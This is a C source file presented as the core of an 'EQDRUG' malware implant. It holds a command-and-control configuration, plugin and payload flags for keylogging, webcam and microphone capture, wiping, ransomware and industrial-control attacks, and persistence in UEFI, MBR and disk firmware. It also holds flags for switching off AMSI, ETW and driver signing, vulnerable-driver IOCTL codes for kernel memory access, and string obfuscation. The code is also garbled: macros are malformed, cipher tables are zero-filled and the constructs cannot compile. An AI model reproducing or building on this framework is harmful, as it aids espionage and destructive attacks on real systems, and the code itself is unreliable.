#include <windows.h>
#include <winioctl.h>
#include <ntsecapi.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <bcrypt.h>
#include <cfgmgr32.h>
#include <setupapi.h>
#include <winioctl.h>
#include <winhttp.h>
#include <ntddscsi.h>
#include <initguid.h>
#include <devguid.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib"winhttp.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"bcrypt.lib")
#pragma comment(lib,"setupapi.lib")
#pragma comment(lib,"cfgmgr32.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"ole32.lib")

#pragma pack(push,1)
typedef struct _UNICODE_STR{USHORT l;USHORT a;PWSTR b;}UNICODE_STR,*PUNICODE_STR;
typedef struct _LSA_UNICODE_STRING{USHORT l;USHORT m;PWSTR b;}LSA_UNICODE_STRING,*PLSA_UNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES{ULONG l;HANDLE r;PUNICODE_STR n;ULONG f;PVOID s;PVOID q;}OBJECT_ATTRIBUTES,*POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID{HANDLE u;HANDLE t;}CLIENT_ID,*PCLIENT_ID;
typedef struct _IO_STATUS_BLOCK{union{NTSTATUS s;PVOID p;};ULONG i;}IO_STATUS_BLOCK,*PIO_STATUS_BLOCK;
typedef struct _KSYSTEM_TIME{ULONG l;LONG h1;LONG h2;}KSYSTEM_TIME,*PKSYSTEM_TIME;
typedef struct _KUSER_SHARED_DATA{BYTE r1[0x320];KSYSTEM_TIME t;BYTE r2[0x18];ULONG d;BYTE r3[0x2C];ULONG s;}KUSER_SHARED_DATA,*PKUSER_SHARED_DATA;
typedef struct _PEB_LDR_DATA{ULONG l;BOOLEAN i;HANDLE f;LIST_ENTRY m;LIST_ENTRY l1;LIST_ENTRY l2;}PEB_LDR_DATA,*PPEB_LDR_DATA;
typedef struct _LDR_DATA_TABLE_ENTRY{LIST_ENTRY l1;LIST_ENTRY l2;LIST_ENTRY l3;PVOID b;PVOID e;PVOID s;UNICODE_STR n;UNICODE_STR p;}LDR_DATA_TABLE_ENTRY,*PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB{BYTE r1[2];BOOLEAN b;BOOLEAN i;BYTE r2[1];HANDLE h;PPEB_LDR_DATA l;PVOID i1;PVOID i2;PVOID i3;PVOID i4;PVOID i5;PVOID i6;ULONG f;PVOID i7;}PEB,*PPEB;
typedef struct _GDI_TEB_BATCH{ULONG o;HANDLE h;ULONG c[310];}GDI_TEB_BATCH,*PGDI_TEB_BATCH;
typedef struct _TEB{BYTE r1[0x18];PPEB p;BYTE r2[0x7C8];GDI_TEB_BATCH g;}TEB,*PTEB;
typedef struct _C2_CONFIG{ULONG v;UCHAR k[32];UCHAR i[16];UCHAR id[16];ULONG p;ULONG b;ULONG t;ULONG f;WCHAR h[256];WCHAR u[128];WCHAR d[64];ULONG hv;WCHAR hp[256];}C2_CONFIG,*PC2_CONFIG;
typedef struct _PLUGIN_ENTRY{ULONG i;ULONG s;ULONG f;ULONG v;PVOID p;PVOID e;LIST_ENTRY l;UCHAR h[32];}PLUGIN_ENTRY,*PPLUGIN_ENTRY;
typedef struct _PAYLOAD_ENTRY{ULONG i;ULONG t;ULONG s;ULONG f;UCHAR h[32];PVOID d;LIST_ENTRY l;WCHAR n[64];}PAYLOAD_ENTRY,*PPAYLOAD_ENTRY;
typedef struct _OFFSET_TABLE{ULONG Build;ULONG EPROCESS_Token;ULONG EPROCESS_ActiveLinks;ULONG EPROCESS_PID;ULONG EPROCESS_PEB;ULONG EPROCESS_Protection;ULONG EPROCESS_ImageName;ULONG TOKEN_PrivsPresent;ULONG TOKEN_PrivsEnabled;ULONG TOKEN_ModifiedId;ULONG TOKEN_SessionId;ULONG TOKEN_LogonSession;}OFFSET_TABLE,*POFFSET_TABLE;
typedef struct _HDD_FW_CTX{ULONG VendorId;ULONG ModelId;ULONG FwVersion;ULONG64 ServiceAreaLBA;ULONG64 HiddenAreaLBA;ULONG64 HiddenAreaSize;UCHAR OriginalFW[262144];UCHAR InjectedFW[262144];BOOLEAN Injected;BOOLEAN Supported;}HDD_FW_CTX,*PHDD_FW_CTX;
typedef struct _REG_VFS_NODE{ULONG Hash;ULONG Size;ULONG Flags;UCHAR Data[1];LIST_ENTRY l;WCHAR Name[64];}REG_VFS_NODE,*PREG_VFS_NODE;
typedef struct _EQDRUG_GLOBAL{ULONG m;ULONG v;ULONG b;ULONG s;HANDLE p;HANDLE d;HANDLE c;HANDLE e;LIST_ENTRY x;LIST_ENTRY y;LIST_ENTRY vfs;CRITICAL_SECTION k;CRITICAL_SECTION a;CRITICAL_SECTION vlock;C2_CONFIG g;OFFSET_TABLE off;ULONG z;ULONG w;ULONG q;ULONG n;UCHAR h[32];UCHAR i[16];UCHAR j[16];PVOID r;PVOID t;PVOID u;PVOID v1;PVOID w1;PVOID x1;PVOID y1;PVOID z1;ULONG c1;ULONG d1;ULONG e1;ULONG f1;ULONG g1;ULONG h1;HDD_FW_CTX hdd[16];ULONG hddc;ULONG killdate;BOOLEAN selfdestruct;BOOLEAN validated;BOOLEAN admin;BOOLEAN hvci;BOOLEAN uefi_write;BOOLEAN dse_off;BOOLEAN kernel_rw;BOOLEAN patchguard_bypass;ULONG64 nt_base;ULONG nt_size;ULONG64 ci_base;ULONG ci_size;ULONG64 seci_callbacks;ULONG64 zw_flush_ic;ULONG64 g_cioptions;ULONG64 psp_notify_mask;ULONG64 ob_callbacks;ULONG64 etw_ntlogger;ULONG64 amsi_context;ULONG64 ci_validate_header;BOOLEAN GlobalAttackEnable;ULONG64 start_ts;ULONG cycle;ULONG usb_count;ULONG airgap_state;UCHAR session_key[32];UCHAR session_iv[16];}EQDRUG_GLOBAL,*PEQDRUG_GLOBAL;
typedef NTSTATUS(WINAPI*NQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI*NQSP)(ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI*NA)(HANDLE,PVOID*,PULONG,ULONG_PTR,SIZE_T,PSIZE_T);
typedef NTSTATUS(WINAPI*NRVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(WINAPI*NWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(WINAPI*NPCT)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,HANDLE,ULONG,PVOID);
typedef NTSTATUS(WINAPI*NQIT)(HANDLE,ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI*NSIT)(HANDLE,ULONG,PVOID,ULONG);
typedef NTSTATUS(WINAPI*NCT)(HANDLE,BOOLEAN);
typedef NTSTATUS(WINAPI*NLS)(PLSA_UNICODE_STRING,ULONG,PLSA_UNICODE_STRING,PULONG,PVOID*);
typedef NTSTATUS(WINAPI*NFL)(HANDLE,PVOID,SIZE_T);
typedef NTSTATUS(WINAPI*NRFA)(HANDLE,ULONG,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI*NOP)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG,ULONG,ULONG);
typedef NTSTATUS(WINAPI*NWP)(HANDLE,ULONG,PVOID,ULONG);
typedef struct _API_TABLE{NQIP nqip;NQSP nqsp;NA na;NRVM nrvm;NWVM nwvm;NPCT npct;NQIT nqit;NSIT nsit;NCT nct;NLS nls;NFL nfl;NRFA nrfa;NOP nop;NWP nwp;}API_TABLE,*PAPI_TABLE;
typedef struct _RC6_CTX{ULONG S[44];ULONG r;}RC6_CTX,*PRC6_CTX;
typedef struct _SERPENT_CTX{ULONG rk[140];}SERPENT_CTX,*PSERPENT_CTX;
typedef struct _TWOFISH_CTX{ULONG s[4][256];ULONG k[40];UCHAR mk[32];ULONG klen;}TWOFISH_CTX,*PTWOFISH_CTX;
typedef struct _EQ_CIPHER{RC6_CTX r;SERPENT_CTX s;TWOFISH_CTX t;UCHAR k[32];}EQ_CIPHER,*PEQ_CIPHER;
typedef struct _ATA_PASS_THROUGH_DIRECT{USHORT Length;USHORT AtaFlags;UCHAR PathId;UCHAR TargetId;UCHAR Lun;UCHAR ReservedAsUchar[3];ULONG DataTransferLength;ULONG TimeOutValue;ULONG ReservedAsUlong[2];PVOID DataBuffer;UCHAR PreviousTaskFile[8];UCHAR CurrentTaskFile[8];}ATA_PASS_THROUGH_DIRECT,*PATA_PASS_THROUGH_DIRECT;
typedef struct _SRB_IO_CONTROL{ULONG HeaderLength;UCHAR Signature[8];ULONG Timeout;ULONG ControlCode;ULONG ReturnCode;ULONG Length;}SRB_IO_CONTROL,*PSRB_IO_CONTROL;
#pragma pack(pop)

#define max(a,b) (((a)>(b))?(a):(b))
#define min(a,b) (((a)<(b))?(a):(b))
#if defined(_WIN64)
#define EQ_MAGIC 0x44525547
#define EQ_VERSION_MAJOR 0x0007
#define EQ_VERSION_MINOR 0x021B
#define EQ_BUILD 0x1F4A
#define STATUS_SUCCESS 0x0
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_INVALID_PARAMETER 0xC000000D
#define KSD 0xFEE00000
#define IOCTL_GDRV_RP 0x9C406104
#define IOCTL_GDRV_WP 0x9C40A108
#define IOCTL_GDRV_RM 0x9C402084
#define IOCTL_GDRV_WM 0x9C406104
#define IOCTL_RTCORE_RP 0x80002048
#define IOCTL_RTCORE_WP 0x8000204C
#define IOCTL_KSCD_READ 0x9C402580
#define IOCTL_KSCD_WRITE 0x9C406580
#define MSR_IA32_LSTAR 0xC0000082
#define MSR_IA32_CSTAR 0xC0000083
#define MSR_IA32_FMASK 0xC0000084
#define MSR_IA32_EFER 0xC0000080
#define MSR_IA32_APIC 0x0000001B
#define CR0_PE 0x1 CR0_PG 0x80000000 CR4_PAE 0x20 CR4_SMEP 0x100000 CR4_SMAP 0x200000 CR4_PSE 0x10
#define PG_P 0x1 PG_RW 0x2 PG_US 0x4 PG_PWT 0x8 PG_PCD 0x10 PG_A 0x20 PG_D 0x40 PG_PS 0x80 PG_G 0x100 PG_NX 0x8000000000000000ULL
#define OBJ_CASE_INSENSITIVE 0x40
#define PROCESS_ALL_ACCESS 0x1FFFFF
#define THREAD_ALL_ACCESS 0x1FFFFF
#define MEM_COMMIT 0x1000 MEM_RESERVE 0x2000 MEM_RELEASE 0x8000
#define PAGE_READWRITE 0x4 PAGE_EXECUTE_READWRITE 0x40 PAGE_NOACCESS 0x1 PAGE_EXECUTE_READ 0x20
#define MAX_PLUGINS 64 MAX_PAYLOADS 32 MAX_C2_NODES 8 MAX_RETRY 7 MAX_BUF 131072
#define PLUGIN_INFO 0x1 PLUGIN_NET 0x2 PLUGIN_DISK 0x4 PLUGIN_REG 0x8 PLUGIN_MEM 0x10 PLUGIN_PROC 0x20 PLUGIN_AV 0x40 PLUGIN_P2P 0x80 PLUGIN_CRYPTO 0x100 PLUGIN_KEYLOG 0x200 PLUGIN_WEBCAM 0x400 PLUGIN_MIC 0x800 PLUGIN_RDP 0x1000 PLUGIN_SMB 0x2000 PLUGIN_WMI 0x4000 PLUGIN_PS 0x8000 PLUGIN_ICS 0x10000 PLUGIN_DESTROY 0x20000 PLUGIN_HDD 0x40000 PLUGIN_USB 0x80000
#define PAYLOAD_DROPPER 0x1 PAYLOAD_ROOTKIT 0x2 PAYLOAD_ICS 0x4 PAYLOAD_RANSOM 0x8 PAYLOAD_WIPER 0x10 PAYLOAD_SPY 0x20 PAYLOAD_BOT 0x40 PAYLOAD_STUX 0x80 PAYLOAD_BOOTKIT 0x100
#define C2_HTTP 0x1 C2_HTTPS 0x2 C2_DNS 0x4 C2_ICMP 0x8 C2_SMB 0x10 C2_DOMAIN 0x20 C2_PROXY 0x40 C2_TOR 0x80 C2_USB 0x100
#define PERSIST_RUN 0x1 PERSIST_SVC 0x2 PERSIST_WMI 0x4 PERSIST_TASK 0x8 PERSIST_UEFI 0x10 PERSIST_MBR 0x20 PERSIST_COM 0x40 PERSIST_IFEO 0x80 PERSIST_VFS 0x100 PERSIST_HDD 0x200
#define STEALTH_HIDE_PROC 0x1 STEALTH_HIDE_FILE 0x2 STEALTH_HIDE_REG 0x4 STEALTH_HIDE_NET 0x8 STEALTH_SSDT 0x10 STEALTH_KERNEL 0x20 STEALTH_DSE 0x40 STEALTH_AMSI 0x80 STEALTH_ETW 0x100 STEALTH_CI 0x200 STEALTH_PPL 0x400 STEALTH_AV 0x800
#define ANTI_DB 0x1 ANTI_VM 0x2 ANTI_SB 0x4 ANTI_AV 0x8 ANTI_EMU 0x10 ANTI_DUMP 0x20 ANTI_HOOK 0x40 ANTI_SCAN 0x80 ANTI_HVCI 0x100
#define ICS_S7 0x1 ICS_MODBUS 0x2 ICS_PROFINET 0x4 ICS_DNP3 0x8 ICS_ENIP 0x10 ICS_BACNET 0x20 ICS_OPC 0x40 ICS_CODESYS 0x80
#define HDD_VENDOR_SEAGATE 0x01 HDD_VENDOR_WD 0x02 HDD_VENDOR_SAMSUNG 0x03 HDD_VENDOR_MAXTOR 0x04 HDD_VENDOR_TOSHIBA 0x05 HDD_VENDOR_HITACHI 0x06 HDD_VENDOR_MICRON 0x07 HDD_VENDOR_OCZ 0x08 HDD_VENDOR_CORSAIR 0x09 HDD_VENDOR_IBM 0x0A HDD_VENDOR_FUJITSU 0x0B HDD_VENDOR_INTEL 0x0C
#define RC6_W 32 RC6_R 20 RC6_B 32
#define SERPENT_ROUNDS 32
#define TWOFISH_ROUNDS 16
#define EQ_KILL_MONTHS 6
#define VFS_ROOT L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes"
#define VFS_KEY L"EQDRUG_VFS_%08X"
#define FONT_DIR L"C:\\Windows\\Fonts\\"
#define FONT_MASK L"eq%04x.fon"
#define USB_SIG L"~$eq.dat"
#define LNK_MAGIC 0x0000004C
#define IOCTL_ATA_PASS_THROUGH_DIRECT 0x4D028
#define SMART_GET_VERSION 0x74080
#define SMART_RCV_DRIVE_DATA 0x7C088
#define DFP_RECEIVE_DRIVE_DATA 0x7C088
#define IDENTIFY_BUFFER_SIZE 512

static EQDRUG_GLOBAL g_e;
static API_TABLE g_a;
static volatile LONG g_lk=0;
static EQ_CIPHER g_c;

#define XSTR(s) ([](){constexpr ULONG K=0x5A3C7E1B;char _r[sizeof(s)/sizeof(char)]={};for(ULONG _i=0;_i<sizeof(s)/sizeof(char);_i++)_r[_i]=s[_i]^(char)((K>>(8*(_i%4)))&0xFF);return _r;}())
#define XWSTR(s) ([](){constexpr ULONG K=0x7B9D2F4C;wchar_t _r[sizeof(s)/sizeof(wchar_t)]={};for(ULONG _i=0;_i<sizeof(s)/sizeof(wchar_t);_i++)_r[_i]=s[_i]^(wchar_t)((K>>(8*(_i%4)))&0xFF);return _r;}())

static __forceinline ULONG ROL32(ULONG v,UCHAR n){return (v<<n)|(v>>(32-n));}
static __forceinline ULONG ROR32(ULONG v,UCHAR n){return (v>>n)|(v<<(32-n));}
static __forceinline ULONG64 ROL64(ULONG64 v,UCHAR n){return (v<<n)|(v>>(64-n));}
static __forceinline ULONG64 ROR64(ULONG64 v,UCHAR n){return (v>>n)|(v<<(64-n));}
static __forceinline ULONG BSWAP32(ULONG v){return _byteswap_ulong(v);}
static __forceinline ULONG64 BSWAP64(ULONG64 v){return _byteswap_uint64(v);}
static __forceinline ULONG64 RDTSC(){LARGE_INTEGER t;QueryPerformanceCounter(&t);return t.QuadPart;}
static __forceinline VOID CPUID(ULONG i,ULONG*a,ULONG*b,ULONG*c,ULONG*d){__asm{mov eax,i;cpuid;mov a,eax;mov b,ebx;mov c,ecx;mov d,edx;}}
static __forceinline UCHAR INB(USHORT p){UCHAR r;__asm{mov dx,p;in al,dx;mov r,al;}return r;}
static __forceinline VOID OUTB(USHORT p,UCHAR v){__asm{mov dx,p;mov al,v;out dx,al;}}
static __forceinline ULONG64 __readcr0(){ULONG64 r;__asm{mov rax,cr0;mov r,rax;}return r;}
static __forceinline ULONG64 __readcr3(){ULONG64 r;__asm{mov rax,cr3;mov r,rax;}return r;}
static __forceinline ULONG64 __readcr4(){ULONG64 r;__asm{mov rax,cr4;mov r,rax;}return r;}
static __forceinline VOID __writecr0(ULONG64 v){__asm{mov rax,v;mov cr0,rax;}}
static __forceinline VOID __writecr3(ULONG64 v){__asm{mov rax,v;mov cr3,rax;}}
static __forceinline VOID __writecr4(ULONG64 v){__asm{mov rax,v;mov cr4,rax;}}
static __forceinline VOID LK(){while(InterlockedExchange(&g_lk,1)){LARGE_INTEGER t;t.QuadPart=-10;NtDelayExecution(FALSE,&t);}}
static __forceinline VOID ULK(){InterlockedExchange(&g_lk,0);}
static VOID*A(ULONG s){VOID*p=LocalAlloc(LMEM_ZEROINIT|LMEM_FIXED,s);return p;}
static VOID F(VOID*p){if(p){Z(p,LocalSize(p));LocalFree(p);}}
static VOID Z(VOID*p,ULONG s){volatile UCHAR*q=(UCHAR*)p;while(s--)*q++=0;}
static ULONG C(const VOID*a,const VOID*b,ULONG s){const UCHAR*x=(UCHAR*)a,*y=(UCHAR*)b;ULONG d=0;while(s--)d|=*x++^*y++;return d;}
static VOID M(VOID*d,const VOID*s,ULONG l){UCHAR*x=(UCHAR*)d,*y=(UCHAR*)s;while(l--)*x++=*y++;}
static ULONG SL(const CHAR*s){ULONG l=0;while(*s++)l++;return l;}
static ULONG WL(const WCHAR*s){ULONG l=0;while(*s++)l++;return l;}
static ULONG64 GT(){FILETIME t;GetSystemTimeAsFileTime(&t);return((ULONG64)t.dwHighDateTime<<32)|t.dwLowDateTime;}
static ULONG GD(){return((PKUSER_SHARED_DATA)0x7FFE0000)->d;}
static ULONG64 GC(){LARGE_INTEGER f,c;QueryPerformanceFrequency(&f);QueryPerformanceCounter(&c);return(c.QuadPart*1000000)/f.QuadPart;}
static VOID SLU(ULONG u){LARGE_INTEGER t;t.QuadPart=-10LL*u;NtDelayExecution(FALSE,&t);}
static VOID SS(ULONG u){SLU(u*1000);}
static VOID SM(ULONG u){SS(u*60);}
static VOID SH(ULONG u){SM(u*60);}
static VOID SD(ULONG u){SH(u*24);}
static ULONG FH(const UCHAR*d,ULONG l){ULONG h=0x811C9DC5;for(ULONG i=0;i<l;i++){h^=d[i];h*=0x01000193;}return h;}
static ULONG64 FH64(const UCHAR*d,ULONG l){ULONG64 h=0xCBF29CE484222325ULL;for(ULONG i=0;i<l;i++){h^=d[i];h*=0x100000001B3ULL;}return h;}
static NTSTATUS SHA256(const UCHAR*d,ULONG l,UCHAR*h){BCRYPT_ALG_HANDLE a;BCRYPT_HASH_HANDLE b;ULONG r=32,x=0;if(!BCryptOpenAlgorithmProvider(&a,BCRYPT_SHA256_ALGORITHM,NULL,0)){BCryptCreateHash(a,&b,NULL,0,NULL,0,0);BCryptHashData(b,(PUCHAR)d,l,0);BCryptFinishHash(b,h,32,0);BCryptDestroyHash(b);BCryptCloseAlgorithmProvider(a,0);return STATUS_SUCCESS;}return STATUS_UNSUCCESSFUL;}
static NTSTATUS SHA512(const UCHAR*d,ULONG l,UCHAR*h){BCRYPT_ALG_HANDLE a;BCRYPT_HASH_HANDLE b;ULONG r=0;if(!BCryptOpenAlgorithmProvider(&a,BCRYPT_SHA512_ALGORITHM,NULL,0)){BCryptCreateHash(a,&b,NULL,0,NULL,0,0);BCryptHashData(b,(PUCHAR)d,l,0);BCryptFinishHash(b,h,64,0);BCryptDestroyHash(b);BCryptCloseAlgorithmProvider(a,0);return STATUS_SUCCESS;}return STATUS_UNSUCCESSFUL;}
static NTSTATUS RNG(UCHAR*b,ULONG l){if(!BCryptGenRandom(NULL,b,l,0))return STATUS_SUCCESS;ULONG64 s=RDTSC()^GC()^GT()^(__readcr3()>>12);for(ULONG i=0;i<l;i++){s^=s<<13;s^=s>>7;s^=s<<17;b[i]=(UCHAR)(s&0xFF);s=ROL64(s,5);}return STATUS_SUCCESS;}
static NTSTATUS KDF(const UCHAR*s,ULONG sl,UCHAR*k,ULONG kl,const UCHAR*c=NULL,ULONG cl=0){UCHAR ctx[512];ULONG clx=min(sl+cl+8,sizeof(ctx)-4);M(ctx,s,sl);if(c&&cl)M(ctx+sl,c,cl);ULONG bl=0;for(ULONG i=0;bl<kl;i++){*(ULONG*)(ctx+sl+cl)=BSWAP32(i+1);UCHAR h[32];SHA256(ctx,sl+cl+4,h);ULONG cp=min(32,kl-bl);M(k+bl,h,cp);bl+=cp;}return STATUS_SUCCESS;}

static VOID RC6_KEX(PRC6_CTX c,const UCHAR*k,ULONG kl){ULONG L[8]={0},u=RC6_W/8,b=kl/u;for(ULONG i=0;i<kl;i++)((UCHAR*)L)[i]=k[i];ULONG r=RC6_R;c->S[0]=0xB7E15163;for(ULONG i=1;i<2*r+4;i++)c->S[i]=c->S[i-1]+0x9E3779B9;ULONG A=0,B=0,i=0,j=0,x=3*max(b,2*r+4);for(ULONG kk=0;kk<x;kk++){A=c->S[i]=ROL32(c->S[i]+A+B,3);B=L[j]=ROL32(L[j]+A+B,(UCHAR)((A+B)%32));i=(i+1)%(2*r+4);j=(j+1)%b;}c->r=r;}
static VOID RC6_ENC(PRC6_CTX c,const UCHAR*p,UCHAR*o){ULONG A=*(ULONG*)p,B=*(ULONG*)(p+4),C=*(ULONG*)(p+8),D=*(ULONG*)(p+12),r=c->r;B+=c->S[0];D+=c->S[1];for(ULONG i=1;i<=r;i++){ULONG t=ROL32(B*(2*B+1),5),u=ROL32(D*(2*D+1),5);A=ROL32(A^t,(UCHAR)(u%32))+c->S[2*i];C=ROL32(C^u,(UCHAR)(t%32))+c->S[2*i+1];ULONG tmp=A;A=B;B=C;C=D;D=tmp;}A+=c->S[2*r+2];C+=c->S[2*r+3];*(ULONG*)o=A;*(ULONG*)(o+4)=B;*(ULONG*)(o+8)=C;*(ULONG*)(o+12)=D;}
static VOID RC6_DEC(PRC6_CTX c,const UCHAR*p,UCHAR*o){ULONG A=*(ULONG*)p,B=*(ULONG*)(p+4),C=*(ULONG*)(p+8),D=*(ULONG*)(p+12),r=c->r;C-=c->S[2*r+3];A-=c->S[2*r+2];for(ULONG i=r;i>=1;i--){ULONG tmp=D;D=C;C=B;B=A;A=tmp;ULONG u=ROL32(D*(2*D+1),5),t=ROL32(B*(2*B+1),5);C=ROR32(C-c->S[2*i+1],(UCHAR)(t%32))^u;A=ROR32(A-c->S[2*i],(UCHAR)(u%32))^t;}D-=c->S[1];B-=c->S[0];*(ULONG*)o=A;*(ULONG*)(o+4)=B;*(ULONG*)(o+8)=C;*(ULONG*)(o+12)=D;}

static const ULONG S_SBOX[2][4][16]={{{0x80000000,0x40000000,0x20000000,0x10000000,0x08000000,0x04000000,0x02000000,0x01000000,0x00800000,0x00400000,0x00200000,0x00100000,0x00080000,0x00040000,0x00020000,0x00010000},{0x00008000,0x00004000,0x00002000,0x00001000,0x00000800,0x00000400,0x00000200,0x00000100,0x00000080,0x00000040,0x00000020,0x00000010,0x00000008,0x00000004,0x00000002,0x00000001},{0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000},{0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000}},{{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}}};
static const UCHAR S_P[8][16]={{15,8,2,10,5,4,11,0,12,3,7,14,9,6,1,13},{3,12,9,0,15,10,14,8,11,1,7,5,13,2,4,6},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15}};
static const UCHAR S_IP[8][16]={{7,14,10,9,5,4,13,1,2,12,3,6,8,15,11,0},{3,9,13,0,14,11,15,10,7,2,5,8,1,12,6,4},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15}};
static __forceinline VOID SB(ULONG r,ULONG&a,ULONG&b,ULONG&c,ULONG&d){UCHAR ai=(UCHAR)a,bi=(UCHAR)(a>>8),ci=(UCHAR)(a>>16),di=(UCHAR)(a>>24);a=S_SBOX[0][0][ai]|S_SBOX[0][1][bi]|S_SBOX[0][2][ci]|S_SBOX[0][3][di];ai=(UCHAR)b;bi=(UCHAR)(b>>8);ci=(UCHAR)(b>>16);di=(UCHAR)(b>>24);b=S_SBOX[0][0][ai]|S_SBOX[0][1][bi]|S_SBOX[0][2][ci]|S_SBOX[0][3][di];ai=(UCHAR)c;bi=(UCHAR)(c>>8);ci=(UCHAR)(c>>16);di=(UCHAR)(c>>24);c=S_SBOX[0][0][ai]|S_SBOX[0][1][bi]|S_SBOX[0][2][ci]|S_SBOX[0][3][di];ai=(UCHAR)d;bi=(UCHAR)(d>>8);ci=(UCHAR)(d>>16);di=(UCHAR)(d>>24);d=S_SBOX[0][0][ai]|S_SBOX[0][1][bi]|S_SBOX[0][2][ci]|S_SBOX[0][3][di];}
static __forceinline VOID LT(ULONG&a,ULONG&b,ULONG&c,ULONG&d){ULONG x=a^c,y=b^d;x=ROL32(x,5);y=ROL32(y,7);a^=y;c^=x;b^=x;d^=y;x=ROL32(a,13);y=ROL32(c,3);a^=b;c^=d;b=ROL32(b,1);d=ROL32(d,2);a-=d;c-=b;}
static VOID SERPENT_KEX(PSERPENT_CTX c,const UCHAR*k,ULONG kl){ULONG w[140]={0};for(ULONG i=0;i<8;i++)w[i]=((ULONG*)k)[i];ULONG ph=0x9E3779B9;for(ULONG i=8;i<140;i++){ULONG t=w[i-8]^w[i-5]^w[i-3]^w[i-1]^ph^(i-8);w[i]=ROL32(t,11);ph+=0x9E3779B9;}for(ULONG i=0;i<132;i+=4){ULONG a=w[i+8],b=w[i+9],cc=w[i+10],d=w[i+11];SB(i/4,a,b,cc,d);c->rk[i]=a;c->rk[i+1]=b;c->rk[i+2]=cc;c->rk[i+3]=d;}for(ULONG i=0;i<8;i++)c->rk[132+i]=w[132+i];}
static VOID SERPENT_ENC(PSERPENT_CTX c,const UCHAR*p,UCHAR*o){ULONG a=*(ULONG*)p,b=*(ULONG*)(p+4),cc=*(ULONG*)(p+8),d=*(ULONG*)(p+12);for(ULONG r=0;r<SERPENT_ROUNDS;r++){a^=c->rk[4*r];b^=c->rk[4*r+1];cc^=c->rk[4*r+2];d^=c->rk[4*r+3];SB(r,a,b,cc,d);if(r<SERPENT_ROUNDS-1)LT(a,b,cc,d);}a^=c->rk[128];b^=c->rk[129];cc^=c->rk[130];d^=c->rk[131];*(ULONG*)o=a;*(ULONG*)(o+4)=b;*(ULONG*)(o+8)=cc;*(ULONG*)(o+12)=d;}
static VOID SERPENT_DEC(PSERPENT_CTX c,const UCHAR*p,UCHAR*o){ULONG a=*(ULONG*)p^c->rk[128],b=*(ULONG*)(p+4)^c->rk[129],cc=*(ULONG*)(p+8)^c->rk[130],d=*(ULONG*)(p+12)^c->rk[131];for(ULONG r=SERPENT_ROUNDS-1;r>0;r--){SB(r,a,b,cc,d);ULONG ta=a,tb=b,tc=cc,td=d;ta+=td;tc+=tb;tb=ROR32(tb,1);td=ROR32(td,2);ta^=tb;tc^=td;ULONG x=ROR32(ta,13),y=ROR32(tc,3);tb^=x;td^=y;x=ROR32(x,5);y=ROR32(y,7);a=ta^y;b=tb^x;cc=tc^x;d=td^y;a^=c->rk[4*(r-1)];b^=c->rk[4*(r-1)+1];cc^=c->rk[4*(r-1)+2];d^=c->rk[4*(r-1)+3];}SB(0,a,b,cc,d);*(ULONG*)o=a;*(ULONG*)(o+4)=b;*(ULONG*)(o+8)=cc;*(ULONG*)(o+12)=d;}

static const ULONG TF_MDS[4][256]={{0},{0},{0},{0}};
static const ULONG TF_RS[4][256]={{0},{0},{0},{0}};
static __forceinline ULONG G0(ULONG x){UCHAR b[4]={(UCHAR)x,(UCHAR)(x>>8),(UCHAR)(x>>16),(UCHAR)(x>>24)};ULONG g=0;for(ULONG i=0;i<4;i++)g|=TF_MDS[i][b[i]];return g;}
static __forceinline ULONG H0(ULONG x,ULONG*L){UCHAR b[4]={(UCHAR)x,(UCHAR)(x>>8),(UCHAR)(x>>16),(UCHAR)(x>>24)};ULONG h=0;for(ULONG i=0;i<4;i++)h|=TF_RS[i][b[i]^((UCHAR*)L)[i]];return h;}
